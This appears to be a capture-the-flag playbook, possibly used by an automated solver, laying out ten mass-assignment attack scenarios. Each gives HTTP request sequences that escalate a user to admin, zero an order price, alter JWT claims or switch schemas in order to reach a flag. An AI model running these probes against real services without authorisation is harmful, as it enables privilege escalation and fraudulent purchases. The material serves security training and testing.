# Workflow scenarios — the engagement flow by outcome

## Scenario A — the clean solve

```
PATCH /users/me {"role":"admin"}  →  GET /api/me "role":"admin"
                                  →  GET /admin 200 + flag
```

Four requests, one bound field, the gate opens. Record class+impact,
pre-flag the flag, classify_solve.

## Scenario B — the nested tunnel solve

```
PATCH /users/me {"role":"admin"}            → "role":"user"  (flat drop)
PATCH /users/me {"profile":{"role":"admin"}} → "role":"admin" (nested lands)
GET /admin → 200 + flag
```

Flat allowlist drops `role`; `profile` is allowed; the deep merge
reaches `profile.role`. Two probes.

## Scenario C — the semantic pivot

```
PATCH /users/me {"role":"admin"}     → "role":"admin" stored
GET /admin → 403                      → inert — gate reads is_staff
PATCH /users/me {"is_staff":true}     → "is_staff":true
GET /admin → 200 + flag
```

`role` bound but the gate reads `is_staff` — the inert-field pivot to
the gate's real field.

## Scenario D — the carrier pivot

```
PATCH /users/me {"role":"admin"} (json)   → 400 unknown property
PATCH /users/me -d 'role=admin' (form)     → "role":"admin" lands
GET /admin → 200 + flag
```

JSON schema rejects; the form path binds — different parser, different
allowlist.

## Scenario E — the second-binder solve

```
POST /register {"role":"admin"}    → "role":"user" (register allowlist)
PATCH /users/me {"role":"admin"}   → "role":"admin" (update wider)
GET /admin → 200 + flag
```

Register's allowlist tight; the profile update's wider — the second
binder is the live hole.

## Scenario F — the economic solve

```
POST /orders {"product":"flag-item","price":0}
POST /checkout {"order_id":9}   → total:0 → "purchased" the flag item
GET /orders/9 → flag
```

The bound `price` reaches the totals — the economic shape.

## Scenario G — the chained solve

```
PATCH /users/me {"role":"admin"}   → role opens /admin
POST /admin/users {"flag_visible":true}   → admin binder's own MA
GET /api/flag → flag
```

Two binders deep — the bound role unlocks the second binder.

## Scenario H — the JWT re-issue solve

```
PATCH /users/me {"role":"admin"}   → stored
POST /logout; POST /login           → re-issued token carries role
GET /admin → 200 + flag
```

The bound `role` lands in the re-issued JWT — the gate reads the token.

## Scenario I — the discriminator solve

```
POST /register {"_t":"AdminUser"}   → schema switches
PATCH /users/me {"clearance":"top"} → AdminUser's privileged field binds
GET /flag → flag
```

The bound `_t` switches the sub-schema to the privileged variant.

## Scenario J — the honest falsifier

```
role/is_admin/verified/balance all drop on every endpoint+carrier
→ binder-family falsifier
→ check /import, GraphQL, /admin — also dead
→ GET shows no privileged fields — model falsifier
→ class dead → decide.py names the next class
```

The honest dead-end — record the falsifier map, pivot classes.
